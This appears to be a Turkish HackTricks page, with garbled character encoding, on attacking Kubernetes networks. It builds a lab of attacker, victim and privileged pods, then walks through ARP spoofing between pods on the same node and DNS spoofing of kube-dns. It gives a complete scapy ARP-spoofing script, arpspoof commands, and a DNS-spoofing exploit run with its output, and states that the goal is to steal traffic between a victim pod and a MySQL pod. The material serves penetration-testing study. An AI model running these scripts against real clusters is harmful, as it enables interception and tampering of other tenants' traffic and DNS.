# Kubernetes AÄŸ SaldÄ±rÄ±larÄ±

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## GiriÅŸ

Kubernetes'te, **aynÄ± dÃ¼ÄŸÃ¼mde bulunan tÃ¼m konteynerler arasÄ±nda baÄŸlantÄ± kurulmasÄ±na izin veren** bir varsayÄ±lan davranÄ±ÅŸ gÃ¶zlemlenir. Bu, ad alanÄ± ayrÄ±mlarÄ±na bakÄ±lmaksÄ±zÄ±n geÃ§erlidir. Bu baÄŸlantÄ±, **Katman 2** (Ethernet) seviyesine kadar uzanÄ±r. SonuÃ§ olarak, bu yapÄ±landÄ±rma potansiyel olarak sistemi gÃ¼venlik aÃ§Ä±klarÄ±na karÅŸÄ± savunmasÄ±z bÄ±rakÄ±r. Ã–zellikle, bu, **kÃ¶tÃ¼ niyetli bir konteynerin**, aynÄ± dÃ¼ÄŸÃ¼mde bulunan diÄŸer konteynerlere karÅŸÄ± bir **ARP sahtekarlÄ±ÄŸÄ± saldÄ±rÄ±sÄ±** gerÃ§ekleÅŸtirmesine olanak tanÄ±r. Bu tÃ¼r bir saldÄ±rÄ± sÄ±rasÄ±nda, kÃ¶tÃ¼ niyetli konteyner, diÄŸer konteynerler iÃ§in tasarlanmÄ±ÅŸ aÄŸ trafiÄŸini aldatÄ±cÄ± bir ÅŸekilde onlarÄ± hedef alarak yakalayabilir veya deÄŸiÅŸtirebilir.

ARP sahtekarlÄ±ÄŸÄ± saldÄ±rÄ±larÄ±, yerel bir aÄŸ Ã¼zerinde sahtekarlÄ±k yapÄ±lmÄ±ÅŸ ARP (Adres Ã‡Ã¶zÃ¼mleme ProtokolÃ¼) mesajlarÄ±nÄ±n gÃ¶nderilmesini iÃ§erir. Bu, saldÄ±rganÄ±n MAC adresini aÄŸdaki meÅŸru bir bilgisayarÄ±n veya sunucunun IP adresiyle iliÅŸkilendirmesine neden olur. Bu tÃ¼r bir saldÄ±rÄ±nÄ±n baÅŸarÄ±lÄ± bir ÅŸekilde gerÃ§ekleÅŸtirilmesinden sonra, saldÄ±rgan veri iletimi sÄ±rasÄ±nda veriyi yakalayabilir, deÄŸiÅŸtirebilir veya hatta durdurabilir. SaldÄ±rÄ±, OSI modelinin Katman 2'sinde gerÃ§ekleÅŸtirildiÄŸi iÃ§in Kubernetes'teki bu katmanda varsayÄ±lan baÄŸlantÄ± gÃ¼venlik endiÅŸelerine neden olur.

Senaryoda 4 makine oluÅŸturulacak:

* ubuntu-pe: DÃ¼ÄŸÃ¼mden kaÃ§mak ve metrikleri kontrol etmek iÃ§in ayrÄ±calÄ±klÄ± makine (saldÄ±rÄ± iÃ§in gerekli deÄŸil)
* **ubuntu-attack**: VarsayÄ±lan ad alanÄ±nda **kÃ¶tÃ¼ niyetli** bir konteyner
* **ubuntu-victim**: kube-system ad alanÄ±nda **hedef** makine
* **mysql**: VarsayÄ±lan ad alanÄ±nda **hedef** makine
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Temel Kubernetes AÄŸlama

Burada tanÄ±tÄ±lan aÄŸlama konularÄ± hakkÄ±nda daha fazla ayrÄ±ntÄ± isterseniz, referanslara gidin.

### ARP

Genel olarak, **dÃ¼ÄŸÃ¼m iÃ§indeki podlar arasÄ± aÄŸlama**, tÃ¼m podlarÄ± birleÅŸtiren bir **kÃ¶prÃ¼** aracÄ±lÄ±ÄŸÄ±yla mÃ¼mkÃ¼ndÃ¼r. Bu kÃ¶prÃ¼ "cbr0" olarak adlandÄ±rÄ±lÄ±r. (BazÄ± aÄŸ eklentileri kendi kÃ¶prÃ¼lerini kurar.) **cbr0 ayrÄ±ca ARP** (Adres Ã‡Ã¶zÃ¼mleme ProtokolÃ¼) Ã§Ã¶zÃ¼mlemesini de yÃ¶netebilir. Gelen bir paket cbr0'a geldiÄŸinde, ARP kullanarak hedef MAC adresini Ã§Ã¶zebilir.

Bu gerÃ§ek, varsayÄ±lan olarak, **aynÄ± dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan her podun**, ethernet seviyesinde (katman 2) **aynÄ± dÃ¼ÄŸÃ¼mdeki diÄŸer herhangi bir podla iletiÅŸim kurabileceÄŸi** anlamÄ±na gelir (namespace baÄŸÄ±msÄ±z).

{% hint style="warning" %}
Bu nedenle, **aynÄ± dÃ¼ÄŸÃ¼mdeki podlar arasÄ±nda ARP SahtekarlÄ±ÄŸÄ± saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r.**
{% endhint %}

### DNS

Kubernetes ortamlarÄ±nda genellikle kube-system ad alanÄ±nda Ã§alÄ±ÅŸan 1 (veya daha fazla) **DNS hizmeti bulunur**:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
Ã–nceki bilgilerde ilginÃ§ bir ÅŸey gÃ¶rebilirsiniz, **hizmetin IP'si** **10.96.0.10** ancak hizmeti Ã§alÄ±ÅŸtÄ±ran **pod'un IP'si** **172.17.0.2**.

Herhangi bir pod iÃ§inde DNS adresini kontrol ederseniz ÅŸuna benzer bir ÅŸey bulacaksÄ±nÄ±z:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Ancak, podun bu durumda 172.17.0.10/26 olan pod aralÄ±ÄŸÄ±ndaki **adrese nasÄ±l ulaÅŸacaÄŸÄ±nÄ± bilmiyor**.

Bu nedenle, pod, **DNS isteklerini 10.96.0.10 adresine** gÃ¶nderecek ve bu adres cbr0 tarafÄ±ndan **172.17.0.2'ye Ã§evrilecek**.

{% hint style="warning" %}
Bu, bir podun **DNS isteÄŸinin**, DNS sunucusunun pod ile aynÄ± alt aÄŸda olmasÄ± durumunda bile **her zaman kÃ¶prÃ¼ye** (**bridge**) **gideceÄŸi** ve **hizmet IP'sini uÃ§ nokta IP'sine Ã§evireceÄŸi** anlamÄ±na gelir.

Bunu bilerek ve **ARP saldÄ±rÄ±larÄ±nÄ±n mÃ¼mkÃ¼n olduÄŸunu** bilerek, bir dÃ¼ÄŸÃ¼mdeki bir pod, alt aÄŸdaki **her pod** ile kÃ¶prÃ¼ arasÄ±ndaki trafiÄŸi **ele geÃ§irebilecek** ve DNS sunucusundan gelen **DNS yanÄ±tlarÄ±nÄ± deÄŸiÅŸtirebilecektir** (**DNS SahteciliÄŸi**).

DahasÄ±, **DNS sunucusu**, saldÄ±rganla **aynÄ± dÃ¼ÄŸÃ¼mde** bulunuyorsa, saldÄ±rgan, kÃ¼medeki herhangi bir podun (DNS sunucusu ile kÃ¶prÃ¼ arasÄ±ndaki) **tÃ¼m DNS isteklerini ele geÃ§irebilir** ve yanÄ±tlarÄ± deÄŸiÅŸtirebilir.
{% endhint %}

## AynÄ± DÃ¼ÄŸÃ¼mdeki Podlarda ARP SahteciliÄŸi

AmacÄ±mÄ±z, **ubuntu-victim ile mysql arasÄ±ndaki iletiÅŸimi en azÄ±ndan Ã§almaktÄ±r**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

ARPSpoof, aÄŸdaki diÄŸer cihazlarÄ±n ARP (Address Resolution Protocol) tablosunu manipÃ¼le etmek iÃ§in kullanÄ±lan bir saldÄ±rÄ±dÄ±r. Bu saldÄ±rÄ±, aÄŸdaki cihazlarÄ±n iletiÅŸimini engelleyebilir veya yÃ¶nlendirebilir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rgan aÄŸdaki diÄŸer cihazlara sahte ARP yanÄ±tlarÄ± gÃ¶nderir. Bu yanÄ±tlar, saldÄ±rganÄ±n MAC adresini hedef cihazÄ±n IP adresiyle iliÅŸkilendirir. BÃ¶ylece, hedef cihaz, saldÄ±rganÄ±n MAC adresine yÃ¶nlendirilen tÃ¼m trafiÄŸi gÃ¶nderir.

ARPSpoof saldÄ±rÄ±sÄ±, aÄŸdaki trafiÄŸi izlemek, paketleri yakalamak veya hedef cihazÄ±n verilerini Ã§almak iÃ§in kullanÄ±labilir. Bu saldÄ±rÄ±, aÄŸ gÃ¼venliÄŸi aÃ§Ä±sÄ±ndan ciddi bir tehdit oluÅŸturabilir ve aÄŸ yÃ¶neticileri tarafÄ±ndan izlenmelidir.

ARPSpoof saldÄ±rÄ±sÄ±ndan korunmanÄ±n bir yolu, aÄŸdaki tÃ¼m cihazlarÄ±n ARP tablolarÄ±nÄ± dÃ¼zenli olarak kontrol etmek ve sahte ARP yanÄ±tlarÄ±nÄ± tespit etmek iÃ§in bir IDS (Intrusion Detection System) kullanmaktÄ±r. AyrÄ±ca, aÄŸdaki trafiÄŸi ÅŸifrelemek ve gÃ¼venliÄŸi artÄ±rmak iÃ§in VPN (Virtual Private Network) kullanÄ±labilir.
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Daha Ã¶nce belirtildiÄŸi gibi, eÄŸer aynÄ± dÃ¼ÄŸÃ¼mdeki DNS sunucusu pod'unu **ele geÃ§irirseniz**, **ARPSpoofing** ile **kÃ¶prÃ¼yÃ¼ ve DNS** pod'unu **MitM** yapabilir ve **tÃ¼m DNS yanÄ±tlarÄ±nÄ± deÄŸiÅŸtirebilirsiniz**.

Bu iÅŸlemi test etmek iÃ§in gerÃ§ekten gÃ¼zel bir **araÃ§** ve **Ã¶ÄŸretici**ye [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/) adresinden ulaÅŸabilirsiniz.

Senaryomuzda, **saldÄ±rgan pod'a** aracÄ± **indirin** ve **`hosts` adÄ±nda bir dosya** oluÅŸturun. Bu dosyada **spoof yapmak istediÄŸiniz alan adlarÄ±nÄ±** belirtin:
```
cat hosts
google.com. 1.1.1.1
```
Ubuntu-hedef makineye saldÄ±rÄ± gerÃ§ekleÅŸtirin:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Kendi DNS sahtecilik betiÄŸinizi oluÅŸturmaya Ã§alÄ±ÅŸÄ±yorsanÄ±z, **yalnÄ±zca DNS yanÄ±tÄ±nÄ± deÄŸiÅŸtirirseniz** bu iÅŸe yaramayacak, Ã§Ã¼nkÃ¼ yanÄ±t, **kÃ¶tÃ¼ niyetli pod'un IP adresini** iÃ§erecek ve **kabul edilmeyecektir**.\
KurbanÄ±n DNS isteÄŸini gÃ¶nderdiÄŸi DNS'nin **src IP'si** ile birlikte yeni bir DNS paketi oluÅŸturmanÄ±z gerekmektedir (bu genellikle 172.16.0.2 gibi bir ÅŸeydir, 10.96.0.10 ise K8s DNS hizmeti IP'sidir ve DNS sunucusu IP'si deÄŸildir, bununla ilgili daha fazla bilgiye giriÅŸte yer alan kaynaklardan ulaÅŸabilirsiniz).
{% endhint %}

## Trafik Yakalama

[**Mizu**](https://github.com/up9inc/mizu) aracÄ±, Kubernetes iÃ§in basit ancak gÃ¼Ã§lÃ¼ bir API **trafik gÃ¶rÃ¼ntÃ¼leyicisidir**. Hata ayÄ±klama ve geriye dÃ¶nÃ¼k sorun giderme iÃ§in mikro hizmetler arasÄ±ndaki tÃ¼m API iletiÅŸimini gÃ¶rÃ¼ntÃ¼lemenizi saÄŸlar.\
SeÃ§ilen pod'lara ajanlar kuracak ve trafiÄŸe iliÅŸkin bilgileri toplayarak bunlarÄ± bir web sunucusunda size gÃ¶sterecektir. Bunun iÃ§in yÃ¼ksek K8s izinlerine ihtiyacÄ±nÄ±z olacak (ve Ã§ok gizli deÄŸildir).

## Referanslar

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± yapmak veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
